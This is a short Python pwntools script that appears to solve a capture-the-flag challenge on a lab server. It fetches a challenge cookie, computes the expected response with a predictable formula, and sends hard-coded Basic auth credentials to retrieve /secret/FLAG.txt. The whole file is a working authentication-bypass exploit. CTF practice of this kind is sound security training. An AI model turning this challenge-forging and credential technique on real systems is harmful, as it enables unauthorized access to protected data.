#!/usr/bin/env python3
from pwn import *
import base64, re

HOST = 'up.zoolab.org'
PORT = 10933

def calc_response(seed):
    return ((seed * 6364136223846793005) + 1) >> 33

def main():
    # ── 1st request ──────────────────────────────────────────
    io = remote(HOST, PORT)
    io.send(b"GET / HTTP/1.1\r\nHost: up\r\n\r\n")
    head = io.recvuntil(b"\r\n\r\n").decode()
    io.close()

    # 取 challenge cookie
    m = re.search(r"Set-Cookie: challenge=(\d+)", head)
    if not m:
        log.error("challenge cookie not found")
    seed = int(m.group(1))
    log.info(f"reqseed = {seed}")

    # 計算 response
    resp = calc_response(seed)
    log.info(f"response = {resp}")

    # Authorization header（admin:SuperSecretPassword）
    auth = base64.b64encode(b"admin:SuperSecretPassword").decode()

    # ── 2nd request ──────────────────────────────────────────
    io = remote(HOST, PORT)
    payload  = b"GET /secret/FLAG.txt HTTP/1.1\r\n"
    payload += b"Host: up\r\n"
    payload += f"Cookie: response={resp}\r\n".encode()
    payload += f"Authorization: Basic {auth}\r\n".encode()
    payload += b"\r\n"
    io.send(payload)

    # 印出整個回應
    print(io.recvall().decode())

if __name__ == "__main__":
    main()
